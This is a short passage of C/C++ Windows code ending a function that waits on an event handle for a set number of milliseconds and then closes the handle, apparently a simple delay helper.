    if (hEvent != NULL)
    {
        WaitForSingleObjectEx(hEvent, dwMilliseconds, FALSE); // Wait for the specified duration
        CloseHandle(hEvent); // Clean up the event object
    }
}